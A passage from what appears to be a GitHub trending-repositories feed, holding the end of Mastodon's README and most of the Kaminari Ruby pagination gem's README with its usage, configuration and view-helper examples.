href=&#34;https://hub.docker.com/r/tootsuite/mastodon/&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/tootsuite/mastodon.svg?sanitize=true&#34; alt=&#34;Docker Pulls&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Mastodon is a &lt;strong&gt;free, open-source social network server&lt;/strong&gt; based on ActivityPub where users can follow friends and discover new ones. On Mastodon, users can publish anything they want: links, pictures, text, video. All Mastodon servers are interoperable as a federated network (users on one server can seamlessly communicate with users from another one, including non-Mastodon software that implements ActivityPub)!&lt;/p&gt; &#xA;&lt;p&gt;Click below to &lt;strong&gt;learn more&lt;/strong&gt; in a video:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=IPSbNdBmWKE&#34;&gt;&lt;img src=&#34;https://blog.joinmastodon.org/2018/06/why-activitypub-is-the-future/ezgif-2-60f1b00403.gif&#34; alt=&#34;Screenshot&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Navigation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://joinmastodon.org&#34;&gt;Project homepage 🐘&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.patreon.com/mastodon&#34;&gt;Support the development via Patreon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://joinmastodon.org/sponsors&#34;&gt;View sponsors&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.joinmastodon.org&#34;&gt;Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.joinmastodon.org&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://joinmastodon.org/communities&#34;&gt;Browse Mastodon servers&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://joinmastodon.org/apps&#34;&gt;Browse Mastodon apps&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;img src=&#34;https://docs.joinmastodon.org/elephant.svg?sanitize=true&#34; align=&#34;right&#34; width=&#34;30%&#34;&gt; &#xA;&lt;h3&gt;No vendor lock-in: Fully interoperable with any conforming platform&lt;/h3&gt; &#xA;&lt;p&gt;It doesn&#39;t have to be Mastodon; whatever implements ActivityPub is part of the social network! &lt;a href=&#34;https://blog.joinmastodon.org/2018/06/why-activitypub-is-the-future/&#34;&gt;Learn more&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Real-time, chronological timeline updates&lt;/h3&gt; &#xA;&lt;p&gt;Updates of people you&#39;re following appear in real-time in the UI via WebSockets. There&#39;s a firehose view as well!&lt;/p&gt; &#xA;&lt;h3&gt;Media attachments like images and short videos&lt;/h3&gt; &#xA;&lt;p&gt;Upload and view images and WebM/MP4 videos attached to the updates. Videos with no audio track are treated like GIFs; normal videos loop continuously!&lt;/p&gt; &#xA;&lt;h3&gt;Safety and moderation tools&lt;/h3&gt; &#xA;&lt;p&gt;Mastodon includes private posts, locked accounts, phrase filtering, muting, blocking and all sorts of other features, along with a reporting and moderation system. &lt;a href=&#34;https://blog.joinmastodon.org/2018/07/cage-the-mastodon/&#34;&gt;Learn more&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;OAuth2 and a straightforward REST API&lt;/h3&gt; &#xA;&lt;p&gt;Mastodon acts as an OAuth2 provider, so 3rd party apps can use the REST and Streaming APIs. This results in a rich app ecosystem with a lot of choices!&lt;/p&gt; &#xA;&lt;h2&gt;Deployment&lt;/h2&gt; &#xA;&lt;h3&gt;Tech stack:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Ruby on Rails&lt;/strong&gt; powers the REST API and other web pages&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;React.js&lt;/strong&gt; and Redux are used for the dynamic parts of the interface&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt; powers the streaming API&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Requirements:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt; 9.5+&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Redis&lt;/strong&gt; 4+&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Ruby&lt;/strong&gt; 2.5+&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt; 12+&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The repository includes deployment configurations for &lt;strong&gt;Docker and docker-compose&lt;/strong&gt; as well as specific platforms like &lt;strong&gt;Heroku&lt;/strong&gt;, &lt;strong&gt;Scalingo&lt;/strong&gt;, and &lt;strong&gt;Nanobox&lt;/strong&gt;. The &lt;a href=&#34;https://docs.joinmastodon.org/admin/install/&#34;&gt;&lt;strong&gt;standalone&lt;/strong&gt; installation guide&lt;/a&gt; is available in the documentation.&lt;/p&gt; &#xA;&lt;p&gt;A &lt;strong&gt;Vagrant&lt;/strong&gt; configuration is included for development purposes. To use it, complete following steps:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install Vagrant and Virtualbox&lt;/li&gt; &#xA; &lt;li&gt;Install the &lt;code&gt;vagrant-hostsupdater&lt;/code&gt; plugin: &lt;code&gt;vagrant plugin install vagrant-hostsupdater&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;vagrant up&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;vagrant ssh -c &#34;cd /vagrant &amp;amp;&amp;amp; foreman start&#34;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Open &lt;code&gt;http://mastodon.local&lt;/code&gt; in your browser&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Mastodon is &lt;strong&gt;free, open-source software&lt;/strong&gt; licensed under &lt;strong&gt;AGPLv3&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can open issues for bugs you&#39;ve found or features you think are missing. You can also submit pull requests to this repository or submit translations using Crowdin. To get started, take a look at &lt;a href=&#34;https://raw.githubusercontent.com/mastodon/mastodon/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;. If your contributions are accepted into Mastodon, you can request to be paid through &lt;a href=&#34;https://opencollective.com/mastodon&#34;&gt;our OpenCollective&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;IRC channel&lt;/strong&gt;: #mastodon on irc.libera.chat&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Copyright (C) 2016-2022 Eugen Rochko &amp;amp; other Mastodon contributors (see &lt;a href=&#34;https://raw.githubusercontent.com/mastodon/mastodon/main/AUTHORS.md&#34;&gt;AUTHORS.md&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;p&gt;This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.&lt;/p&gt; &#xA;&lt;p&gt;This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more details.&lt;/p&gt; &#xA;&lt;p&gt;You should have received a copy of the GNU Affero General Public License along with this program. If not, see &lt;a href=&#34;https://www.gnu.org/licenses/&#34;&gt;https://www.gnu.org/licenses/&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>kaminari/kaminari</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/kaminari/kaminari</id>
    <link href="https://github.com/kaminari/kaminari" rel="alternate"></link>
    <summary type="html">&lt;p&gt;⚡ A Scope &amp; Engine based, clean, powerful, customizable and sophisticated paginator for Ruby webapps&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Kaminari &lt;a href=&#34;https://github.com/kaminari/kaminari/actions&#34;&gt;&lt;img src=&#34;https://github.com/kaminari/kaminari/actions/workflows/main.yml/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/kaminari/kaminari&#34;&gt;&lt;img src=&#34;https://codeclimate.com/github/kaminari/kaminari/badges/gpa.svg?sanitize=true&#34; alt=&#34;Code Climate&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;A Scope &amp;amp; Engine based, clean, powerful, customizable and sophisticated paginator for modern web app frameworks and ORMs&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;h3&gt;Clean&lt;/h3&gt; &#xA;&lt;p&gt;Does not globally pollute &lt;code&gt;Array&lt;/code&gt;, &lt;code&gt;Hash&lt;/code&gt;, &lt;code&gt;Object&lt;/code&gt; or &lt;code&gt;AR::Base&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Easy to Use&lt;/h3&gt; &#xA;&lt;p&gt;Just bundle the gem, then your models are ready to be paginated. No configuration required. Don&#39;t have to define anything in your models or helpers.&lt;/p&gt; &#xA;&lt;h3&gt;Simple Scope-based API&lt;/h3&gt; &#xA;&lt;p&gt;Everything is method chainable with less &#34;Hasheritis&#34;. You know, that&#39;s the modern Rails way. No special collection class or anything for the paginated values, instead using a general &lt;code&gt;AR::Relation&lt;/code&gt; instance. So, of course you can chain any other conditions before or after the paginator scope.&lt;/p&gt; &#xA;&lt;h3&gt;Customizable Engine-based I18n-aware Helpers&lt;/h3&gt; &#xA;&lt;p&gt;As the whole pagination helper is basically just a collection of links and non-links, Kaminari renders each of them through its own partial template inside the Engine. So, you can easily modify their behaviour, style or whatever by overriding partial templates.&lt;/p&gt; &#xA;&lt;h3&gt;ORM &amp;amp; Template Engine Agnostic&lt;/h3&gt; &#xA;&lt;p&gt;Kaminari supports multiple ORMs (ActiveRecord, DataMapper, Mongoid, MongoMapper) multiple web frameworks (Rails, Sinatra, Grape), and multiple template engines (ERB, Haml, Slim).&lt;/p&gt; &#xA;&lt;h3&gt;Modern&lt;/h3&gt; &#xA;&lt;p&gt;The pagination helper outputs the HTML5 &lt;code&gt;&amp;lt;nav&amp;gt;&lt;/code&gt; tag by default. Plus, the helper supports Rails unobtrusive Ajax.&lt;/p&gt; &#xA;&lt;h2&gt;Supported Versions&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Ruby 2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 3.0, 3.1, 3.2&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Rails 4.1, 4.2, 5.0, 5.1, 5.2, 6.0, 6.1, 7.0, 7.1&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Sinatra 1.4, 2.0&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Haml 3+&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Mongoid 3+&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;MongoMapper 0.9+&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;DataMapper 1.1.0+&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;To install kaminari on the default Rails stack, just put this line in your Gemfile:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#39;kaminari&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then bundle:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% bundle&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you&#39;re building non-Rails of non-ActiveRecord app and want the pagination feature on it, please take a look at &lt;a href=&#34;https://raw.githubusercontent.com/kaminari/kaminari/master/#other-frameworklibrary-support&#34;&gt;Other Framework/Library Support&lt;/a&gt; section.&lt;/p&gt; &#xA;&lt;h2&gt;Query Basics&lt;/h2&gt; &#xA;&lt;h3&gt;The &lt;code&gt;page&lt;/code&gt; Scope&lt;/h3&gt; &#xA;&lt;p&gt;To fetch the 7th page of users (default &lt;code&gt;per_page&lt;/code&gt; is 25)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.page(7)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: pagination starts at page 1, not at page 0 (page(0) will return the same results as page(1)).&lt;/p&gt; &#xA;&lt;p&gt;Kaminari does not add an &lt;code&gt;order&lt;/code&gt; to queries. To avoid surprises, you should generally include an order in paginated queries. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.order(:name).page(7)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can get page numbers or page conditions by using below methods.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.count                     #=&amp;gt; 1000&#xA;User.page(1).limit_value       #=&amp;gt; 20&#xA;User.page(1).total_pages       #=&amp;gt; 50&#xA;User.page(1).current_page      #=&amp;gt; 1&#xA;User.page(1).next_page         #=&amp;gt; 2&#xA;User.page(2).prev_page         #=&amp;gt; 1&#xA;User.page(1).first_page?       #=&amp;gt; true&#xA;User.page(50).last_page?       #=&amp;gt; true&#xA;User.page(100).out_of_range?   #=&amp;gt; true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;The &lt;code&gt;per&lt;/code&gt; Scope&lt;/h3&gt; &#xA;&lt;p&gt;To show a lot more users per each page (change the &lt;code&gt;per&lt;/code&gt; value)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.order(:name).page(7).per(50)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that the &lt;code&gt;per&lt;/code&gt; scope is not directly defined on the models but is just a method defined on the page scope. This is absolutely reasonable because you will never actually use &lt;code&gt;per&lt;/code&gt; without specifying the &lt;code&gt;page&lt;/code&gt; number.&lt;/p&gt; &#xA;&lt;p&gt;Keep in mind that &lt;code&gt;per&lt;/code&gt; internally utilizes &lt;code&gt;limit&lt;/code&gt; and so it will override any &lt;code&gt;limit&lt;/code&gt; that was set previously. And if you want to get the size for all request records you can use &lt;code&gt;total_count&lt;/code&gt; method:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.count                     #=&amp;gt; 1000&#xA;a = User.limit(5); a.count     #=&amp;gt; 5&#xA;a.page(1).per(20).size         #=&amp;gt; 20&#xA;a.page(1).per(20).total_count  #=&amp;gt; 1000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;The &lt;code&gt;padding&lt;/code&gt; Scope&lt;/h3&gt; &#xA;&lt;p&gt;Occasionally you need to pad a number of records that is not a multiple of the page size.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.order(:name).page(7).per(50).padding(3)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that the &lt;code&gt;padding&lt;/code&gt; scope also is not directly defined on the models.&lt;/p&gt; &#xA;&lt;h3&gt;Unscoping&lt;/h3&gt; &#xA;&lt;p&gt;If for some reason you need to unscope &lt;code&gt;page&lt;/code&gt; and &lt;code&gt;per&lt;/code&gt; methods you can call &lt;code&gt;except(:limit, :offset)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;users = User.order(:name).page(7).per(50)&#xA;unpaged_users = users.except(:limit, :offset) # unpaged_users will not use the kaminari scopes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Configuring Kaminari&lt;/h2&gt; &#xA;&lt;h3&gt;General Configuration Options&lt;/h3&gt; &#xA;&lt;p&gt;You can configure the following default values by overriding these values using &lt;code&gt;Kaminari.configure&lt;/code&gt; method.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;default_per_page      # 25 by default&#xA;max_per_page          # nil by default&#xA;max_pages             # nil by default&#xA;window                # 4 by default&#xA;outer_window          # 0 by default&#xA;left                  # 0 by default&#xA;right                 # 0 by default&#xA;page_method_name      # :page by default&#xA;param_name            # :page by default&#xA;params_on_first_page  # false by default&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There&#39;s a handy generator that generates the default configuration file into config/initializers directory. Run the following generator command, then edit the generated file.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rails g kaminari:config&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Changing &lt;code&gt;page_method_name&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;You can change the method name &lt;code&gt;page&lt;/code&gt; to &lt;code&gt;bonzo&lt;/code&gt; or &lt;code&gt;plant&lt;/code&gt; or whatever you like, in order to play nice with existing &lt;code&gt;page&lt;/code&gt; method or association or scope or any other plugin that defines &lt;code&gt;page&lt;/code&gt; method on your models.&lt;/p&gt; &#xA;&lt;h3&gt;Configuring Default per_page Value for Each Model by &lt;code&gt;paginates_per&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;You can specify default &lt;code&gt;per_page&lt;/code&gt; value per each model using the following declarative DSL.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class User &amp;lt; ActiveRecord::Base&#xA;  paginates_per 50&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Configuring Max per_page Value for Each Model by &lt;code&gt;max_paginates_per&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;You can specify max &lt;code&gt;per_page&lt;/code&gt; value per each model using the following declarative DSL. If the variable that specified via &lt;code&gt;per&lt;/code&gt; scope is more than this variable, &lt;code&gt;max_paginates_per&lt;/code&gt; is used instead of it. Default value is nil, which means you are not imposing any max &lt;code&gt;per_page&lt;/code&gt; value.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class User &amp;lt; ActiveRecord::Base&#xA;  max_paginates_per 100&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Configuring max_pages Value for Each Model by &lt;code&gt;max_pages&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;You can specify &lt;code&gt;max_pages&lt;/code&gt; value per each model using the following declarative DSL. This value restricts the total number of pages that can be returned. Useful for setting limits on large collections.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class User &amp;lt; ActiveRecord::Base&#xA;  max_pages 100&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Configuring params_on_first_page when using ransack_memory&lt;/h3&gt; &#xA;&lt;p&gt;If you are using &lt;a href=&#34;https://github.com/richardrails/ransack_memory&#34;&gt;the &lt;code&gt;ransack_memory&lt;/code&gt; gem&lt;/a&gt; and experience problems navigating back to the previous or first page, set the &lt;code&gt;params_on_first_page&lt;/code&gt; setting to &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Controllers&lt;/h2&gt; &#xA;&lt;h3&gt;The Page Parameter Is in &lt;code&gt;params[:page]&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Typically, your controller code will look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;@users = User.order(:name).page params[:page]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Views&lt;/h2&gt; &#xA;&lt;h3&gt;The Same Old Helper Method&lt;/h3&gt; &#xA;&lt;p&gt;Just call the &lt;code&gt;paginate&lt;/code&gt; helper:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will render several &lt;code&gt;?page=N&lt;/code&gt; pagination links surrounded by an HTML5 &lt;code&gt;&amp;lt;nav&amp;gt;&lt;/code&gt; tag.&lt;/p&gt; &#xA;&lt;h2&gt;Helpers&lt;/h2&gt; &#xA;&lt;h3&gt;The &lt;code&gt;paginate&lt;/code&gt; Helper Method&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would output several pagination links such as &lt;code&gt;« First ‹ Prev ... 2 3 4 5 6 7 8 9 10 ... Next › Last »&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Specifying the &#34;inner window&#34; Size (4 by default)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, window: 2 %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would output something like &lt;code&gt;... 5 6 7 8 9 ...&lt;/code&gt; when 7 is the current page.&lt;/p&gt; &#xA;&lt;h3&gt;Specifying the &#34;outer window&#34; Size (0 by default)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, outer_window: 3 %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would output something like &lt;code&gt;1 2 3 ...(snip)... 18 19 20&lt;/code&gt; while having 20 pages in total.&lt;/p&gt; &#xA;&lt;h3&gt;Outer Window Can Be Separately Specified by left, right (0 by default)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, left: 1, right: 3 %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would output something like &lt;code&gt;1 ...(snip)... 18 19 20&lt;/code&gt; while having 20 pages in total.&lt;/p&gt; &#xA;&lt;h3&gt;Changing the Parameter Name (&lt;code&gt;:param_name&lt;/code&gt;) for the Links&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, param_name: :pagina %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would modify the query parameter name on each links.&lt;/p&gt; &#xA;&lt;h3&gt;Extra Parameters (&lt;code&gt;:params&lt;/code&gt;) for the Links&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, params: {controller: &#39;foo&#39;, action: &#39;bar&#39;, format: :turbo_stream} %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would modify each link&#39;s &lt;code&gt;url_option&lt;/code&gt;. :&lt;code&gt;controller&lt;/code&gt; and :&lt;code&gt;action&lt;/code&gt; might be the keys in common.&lt;/p&gt; &#xA;&lt;h3&gt;Ajax Links (crazy simple, but works perfectly!)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, remote: true %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would add &lt;code&gt;data-remote=&#34;true&#34;&lt;/code&gt; to all the links inside.&lt;/p&gt; &#xA;&lt;h3&gt;Specifying an Alternative Views Directory (default is kaminari/)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, views_prefix: &#39;templates&#39; %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This would search for partials in &lt;code&gt;app/views/templates/kaminari&lt;/code&gt;. This option makes it easier to do things like A/B testing pagination templates/themes, using new/old templates at the same time as well as better integration with other gems such as &lt;a href=&#34;https://github.com/apotonick/cells&#34;&gt;cells&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;The &lt;code&gt;link_to_next_page&lt;/code&gt; and &lt;code&gt;link_to_previous_page&lt;/code&gt; (aliased to &lt;code&gt;link_to_prev_page&lt;/code&gt;) Helper Methods&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= link_to_next_page @items, &#39;Next Page&#39; %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This simply renders a link to the next page. This would be helpful for creating a Twitter-like pagination feature.&lt;/p&gt; &#xA;&lt;p&gt;The helper methods support a &lt;code&gt;params&lt;/code&gt; option to further specify the link. If &lt;code&gt;format&lt;/code&gt; needs to be set, inlude it in the &lt;code&gt;params&lt;/code&gt; hash.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= link_to_next_page @items, &#39;Next Page&#39;, params: {controller: &#39;foo&#39;, action: &#39;bar&#39;, format: :turbo_stream} %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;The &lt;code&gt;page_entries_info&lt;/code&gt; Helper Method&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= page_entries_info @posts %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This renders a helpful message with numbers of displayed vs. total entries.&lt;/p&gt; &#xA;&lt;p&gt;By default, the message will use the humanized class name of objects in collection: for instance, &#34;project types&#34; for ProjectType models. The namespace will be cut out and only the last name will be used. Override this with the &lt;code&gt;:entry_name&lt;/code&gt; parameter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= page_entries_info @posts, entry_name: &#39;item&#39; %&amp;gt;&#xA;#=&amp;gt; Displaying items 6 - 10 of 26 in total&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;The &lt;code&gt;rel_next_prev_link_tags&lt;/code&gt; Helper Method&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= rel_next_prev_link_tags @users %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This renders the rel next and prev link tags for the head.&lt;/p&gt; &#xA;&lt;h3&gt;The &lt;code&gt;path_to_next_page&lt;/code&gt; Helper Method&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= path_to_next_page @users %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This returns the server relative path to the next page.&lt;/p&gt; &#xA;&lt;h3&gt;The &lt;code&gt;path_to_prev_page&lt;/code&gt; Helper Method&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= path_to_prev_page @users %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This returns the server relative path to the previous page.&lt;/p&gt; &#xA;&lt;h2&gt;I18n and Labels&lt;/h2&gt; &#xA;&lt;p&gt;The default labels for &#39;first&#39;, &#39;last&#39;, &#39;previous&#39;, &#39;...&#39; and &#39;next&#39; are stored in the I18n yaml inside the engine, and rendered through I18n API. You can switch the label value per I18n.locale for your internationalized application. Keys and the default values are the following. You can override them by adding to a YAML file in your &lt;code&gt;Rails.root/config/locales&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;en:&#xA;  views:&#xA;    pagination:&#xA;      first: &#34;&amp;amp;laquo; First&#34;&#xA;      last: &#34;Last &amp;amp;raquo;&#34;&#xA;      previous: &#34;&amp;amp;lsaquo; Prev&#34;&#xA;      next: &#34;Next &amp;amp;rsaquo;&#34;&#xA;      truncate: &#34;&amp;amp;hellip;&#34;&#xA;  helpers:&#xA;    page_entries_info:&#xA;      one_page:&#xA;        display_entries:&#xA;          zero: &#34;No %{entry_name} found&#34;&#xA;          one: &#34;Displaying &amp;lt;b&amp;gt;1&amp;lt;/b&amp;gt; %{entry_name}&#34;&#xA;          other: &#34;Displaying &amp;lt;b&amp;gt;all %{count}&amp;lt;/b&amp;gt; %{entry_name}&#34;&#xA;      more_pages:&#xA;        display_entries: &#34;Displaying %{entry_name} &amp;lt;b&amp;gt;%{first}&amp;amp;nbsp;-&amp;amp;nbsp;%{last}&amp;lt;/b&amp;gt; of &amp;lt;b&amp;gt;%{total}&amp;lt;/b&amp;gt; in total&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you use non-English localization see &lt;a href=&#34;https://github.com/svenfuchs/i18n/raw/master/test/test_data/locales/plurals.rb&#34;&gt;i18n rules&lt;/a&gt; for changing &lt;code&gt;one_page:display_entries&lt;/code&gt; block.&lt;/p&gt; &#xA;&lt;h2&gt;Customizing the Pagination 